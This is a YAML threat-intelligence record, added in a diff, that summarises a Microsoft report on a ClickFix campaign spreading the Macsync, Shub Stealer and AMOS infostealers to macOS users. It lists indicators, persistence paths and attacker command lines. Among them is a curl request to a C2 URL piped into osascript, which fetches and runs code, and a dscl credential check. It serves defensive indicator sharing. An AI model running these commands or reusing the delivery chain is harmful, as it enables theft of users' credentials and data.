@@ -1,0 +1,206 @@
+title: Microsoft researchers observe evolution of an infostealer campaign targeting
+  macOS users
+description: Threat actors distribute ClickFixstyle instructions on blog sites and
+  other user-driven content platforms to install system utilities, leading to the
+  deployment of Macsync, Shub Stealer, and AMOS malware.
+attribution: ''
+malware_families:
+- Macsync
+- Shub Stealer
+- AMOS
+- MacSync Stealer
+cves: []
+ttps:
+  processes: []
+  command_lines:
+  - curl -s -H <User-Agent> -d check connect-timeout 5 max-time 10 <candidate_url>
+  - curl -s -X POST <C2_URL> -H <User-Agent> -d <txid>&module | osascript
+  - dscl . -authonly <username>
+  powershell: []
+  scripts: []
+  registry_keys:
+  - /Library/LaunchDaemons/com.finder.helper.plist
+  image_loads: []
+  network_connections:
+  - loader install campaign -> hxxp://<C2 domain>/api/bot/heartbeat
+  - script install campaign -> hxxps://t[.]me/ax03bot
+  - helper install campaign -> hxxp://45.94.47[.]204/api/
+  file_activity:
+  - /tmp/shub_<random ID>/tmp/out.zip
+  - /tmp/<random ID>/tmp/out.zip
+  - ~/LaunchAgents/com.google.keystone.agent.plist
+  - ~/Library/Application Support/Google/GoogleUpdate.app/Contents/MacOS/
+  - /Library/LaunchDaemons/com.finder.helper.plist
+  - ~/.agent
+  - /tmp/starter
+  - /tmp/helper
+  - ~/Library/Application Support/Google/GoogleUpdate.app/Contents/MacOS/GoogleUpdate
+  - ~/Library/LaunchAgents/com.<random value>.plist
+  persistence:
+  - com.google.keystone.agent.plist RunAtLoad
+  - LaunchDaemon plist configured to run .agent wrapper with root privileges
+  - LaunchDaemon configured to run /bin/bash with the path to ~/.agent as its argument
+  process_relations: []
+iocs:
+  hashes:
+  - 9d2da07aa6e7db3fbc36b36f0cfd74f78d5815f5ba55d0f0405cdd668bd13767
+  - 7ca42f1f23dbdc9427c9f135815bb74708a7494ea78df1fbc0fc348ba2a161ae
+  - 241a50befcf5c1aa6dab79664e2ba9cb373cc351cb9de9c3699fd2ecb2afab05
+  - 522fdfaff44797b9180f36c654f77baf5cdeaab861bbf372ccfc1a5bd920d62e
+  ip_addresses:
+  - 45.94.47[.]204
+  - 95.85.251[.]177
+  - 138.124.93[.]32
+  - 168.100.9[.]122
+  - 199.217.98[.]33
+  - 38.244.158[.]103
+  - 38.244.158[.]56
+  - 92.246.136[.]14
+  domains:
+  - t[.]me
+  - cleanmymacos[.]org
+  - mac-storage-guide.squarespace[.]com
+  - claudecodedoc[.]squarespace[.]com
+  - domenpozh[.]net
+  - macos-disk-space[.]medium[.]com
+  - macclean[.]craft[.]me
+  - apple-mac-fix-hidden[.]medium[.]com
+  - rapidfilevault4[.]sbs
+  - coco-fun2[.]com
+  - nitlebuf[.]com
+  - yablochnisok[.]com
+  - mentaorb[.]com
+  - seagalnssteavens[.]com
+  - res2erch-sl0ut[.]com
+  - filefastdata[.]com
+  - metramon[.]com
+  - octopixeldate[.]com
+  - pewweepor092[.]com
+  - bulletproofdomai2n[.]com
+  - benefasts-fhgs2[.]com
+  - repqoow77wiqi[.]com
+  - do2wers[.]com
+  - rapidfilevault4[.]cyou
+  - reews09weersus[.]com
+  - pepepupuchek13[.]com
+  - pewqpeee888[.]com
+  - wewannaliveinpicede[.]com
+  - datasphere[.]us[.]com
+  - rapidfilevault5[.]sbs
+  - coco2-hram[.]com
+  - poeooeowwo777[.]com
+  - korovkamu[.]com
+  - metrikcs[.]com
+  - metlafounder[.]com
+  - terafolt[.]com
+  - haploadpin[.]com
+  - rawmrk[.]com
+  - mikulatur[.]com
+  - milbiorb[.]com
+  - doqeers[.]com
+  - we2luck[.]com
+  - quantumdataserver5[.]homes
+  - bintail[.]com
+  - molokotarelka[.]com
+  - trehlub[.]com
+  - avafex[.]com
+  - rhymbil[.]com
+  - boso6ka[.]com
+  - res2erch-sl2ut[.]com
+  - pilautfile[.]com
+  - bigbossbro777[.]com
+  - miappl[.]com
+  - peloetwq71[.]com
+  - fastfilenext[.]com
+  - beransraol[.]com
+  - pelorso90la[.]com
+  - medoviypirog[.]com
+  - wewannaliveinpice[.]com
+  - malkim[.]com
+  - pipipoopochek6[.]com
+  - hello-brothers777[.]com
+  - dialerformac[.]com
+  - persaniusdimonica8[.]com
+  - hilofet[.]com
+  - tmcnex[.]com
+  - nibelined[.]com
+  - pissispissman[.]com
+  - bankafolder[.]com
+  - perewoisbb0[.]com
+  - us41web[.]live
+  - uk176video[.]live
+  - jihiz[.]com
+  - beltoxer[.]com
+  - swift-sh[.]com
+  - hitkrul[.]com
+  - kofeynayagush[.]com
+  - rvdownloads[.]com
+  - famiode[.]com
+  - contatoplus[.]com
+  - woupp[.]com
+  - saramoftah[.]com
+  - ptrei[.]com
+  - wriconsult[.]com
+  - kayeart[.]com
+  - ejecen[.]com
+  - stinarosen[.]com
+  - biopranica[.]com
+  - raxelpak[.]com
+  - boosterjuices[.]com
+  - ftduk[.]com
+  - dryvecar[.]com
+  - vcopp[.]com
+  - kcbps[.]com
+  - jpbassin[.]com
+  - isgilan[.]com
+  - arkypc[.]com
+  - hacelu[.]com
+  - stclegion[.]com
+  - xeebii[.]com
+  - pla7ina[.]cfd
+  - play67[.]cc
+  - reachnv[.]com
+  - vagturk[.]com
+  - futampako[.]com
+  - lbarticle[.]com
+  - raytherrien[.]com
+  - wusetail[.]com
+  - aforvm[.]com
+  - ouilov[.]com
+  - malext[.]com
+  - rebidy[.]com
+  - octopox[.]com
+  - joeyapple[.]com
+  urls:
+  - hxxps://t[.]me/ax03bot
+  - <C2 domain>/upload.php
+  - <C2 domain>/contact
+  - hxxps://cauterizespray[.]icu/script[.]sh
+  - hxxps://enslaveculprit[.]digital/script[.]sh
+  - hxxps://resilientlimb[.]icu/script[.]sh
+  - hxxps://thickentributary[.]digital/script[.]sh
+  - hxxp://paralegalmustang[.]icu/script[.]sh
+  - hxxps://round5on[.]digital/script[.]sh
+  - hxxps://qjywvkbl[.]degassing-mould[.]digital
+  - hxxps://zg5mkr7q[.]apexharvestor[.]digital
+  - hxxps://kvrnjr30[.]apexharvestor[.]digital
+  - hxxps://yygp4pdh[.]apexharvestor[.]digital
+  - hxxp://138.124.93[.]32/contact
+  - hxxp://168.100.9[.]122/contact
+  - hxxp://199.217.98[.]33/contact
+  - hxxp://38.244.158[.]103/contact
+  - hxxp://38.244.158[.]56/contact
+  - hxxp://92.246.136[.]14/contact
+  - hxxps://avipstudios[.]com/contact
+  - hxxps://joytion[.]com/contact
+  - hxxps://laislivon[.]com/contact
+  - hxxps://mpasvw[.]com/contact
+  - hxxps[://]lakhov[.]com/contact
+authors:
+- Arlette Umuhire Sangwa
+- Kajhon Soyini
+- Srinivasan Govindarajan
+- Michael Melone
+reference: https://www.microsoft.com/en-us/security/blog/2026/05/06/clickfix-campaign-uses-fake-macos-utilities-lures-deliver-infostealers
+date_of_publication: May 06, 2026
+file_creation_date: May 09, 2026
